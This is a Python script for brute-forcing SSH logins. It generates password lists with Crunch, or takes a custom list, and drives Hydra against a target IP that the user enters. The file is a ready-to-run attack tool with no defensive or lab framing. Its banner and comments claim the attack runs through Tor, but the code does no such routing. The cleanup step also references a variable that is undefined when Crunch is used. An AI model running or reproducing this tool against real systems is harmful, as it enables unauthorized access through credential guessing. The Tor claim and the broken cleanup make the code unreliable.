import subprocess
import sys
import os
from colorama import Fore, Style, init
import tempfile

# Initialize Colorama for Windows compatibility
init(autoreset=True)

# Banner
def print_banner():
    print(Fore.GREEN + """
    ============================================
    |     SSH Brute-Force Tool with Hydra      |
    |    Powered by Python + Colorama + Crunch |
    |      Cracking SSH with Hydra & Crunch    |
    |                                          |
    ============================================
    """)

# Function to generate password list using Crunch
def generate_crunch_password_list(min_length, max_length, charset):
    # Create a temporary file to store the generated password list
    password_file = tempfile.NamedTemporaryFile(delete=False)
    password_file.close()

    # Construct the Crunch command
    crunch_command = [
        "crunch", str(min_length), str(max_length), charset, 
        "-o", password_file.name
    ]
    
    print(Fore.YELLOW + f"[+] Generating passwords using Crunch (min: {min_length}, max: {max_length})...")
    
    try:
        # Run Crunch to generate the password list
        subprocess.run(crunch_command, check=True)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[!] Error occurred while generating password list with Crunch: {e}")
        sys.exit(1)

    # Make sure the generated file exists and is non-empty
    if os.path.exists(password_file.name) and os.path.getsize(password_file.name) > 0:
        print(Fore.GREEN + f"[+] Password list generated successfully: {password_file.name}")
    else:
        print(Fore.RED + "[!] Crunch did not generate a valid password file.")
        sys.exit(1)

    return password_file.name

# Function to run Hydra attack with Tor
def run_hydra_attack(target_ip, username_list, password_file):
    print(Fore.YELLOW + f"[+] Starting Hydra attack on SSH at {target_ip} using Tor...")

    # Construct the Hydra command
    hydra_command = [
        "hydra", "-L", username_list, "-P", password_file, 
        "ssh://"+target_ip, "-t", "4"
    ]
    
    try:
        # Execute Hydra command
        subprocess.run(hydra_command, check=True)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[!] Error occurred during Hydra attack: {e}")
        sys.exit(1)

def main():
    # Print banner
    print_banner()
    
    # Get user inputs
    target_ip = input(Fore.CYAN + "[?] Enter target IP address: ")
    username_list = input(Fore.CYAN + "[?] Enter path to username list file: ")
    
    # Ensure the username list exists
    if not os.path.exists(username_list):
        print(Fore.RED + "[!] Username list file does not exist.")
        sys.exit(1)

    # Ask user if they want to use a custom password list or generate one with Crunch
    use_custom_password_list = input(Fore.CYAN + "[?] Do you want to use a custom password list file? (y/n): ").lower()

    if use_custom_password_list == 'y':
        # Get the custom password list file path
        password_list = input(Fore.CYAN + "[?] Enter path to the custom password list file: ")
        if not os.path.exists(password_list):
            print(Fore.RED + "[!] Password list file does not exist.")
            sys.exit(1)
        password_file = password_list
    else:
        # Get Crunch settings for password generation
        min_length = int(input(Fore.CYAN + "[?] Enter minimum password length: "))
        max_length = int(input(Fore.CYAN + "[?] Enter maximum password length: "))
        charset = input(Fore.CYAN + "[?] Enter character set for Crunch (e.g., abc123): ")

        # Generate password list using Crunch
        password_file = generate_crunch_password_list(min_length, max_length, charset)

    # Run Hydra attack with the generated password list (or the custom password list) through Tor
    run_hydra_attack(target_ip, username_list, password_file)

    # Clean up the temporary password file after the attack
    if password_file != password_list:  # Only delete the temp file if it's not a custom list
        os.remove(password_file)

if __name__ == "__main__":
    main()
                 
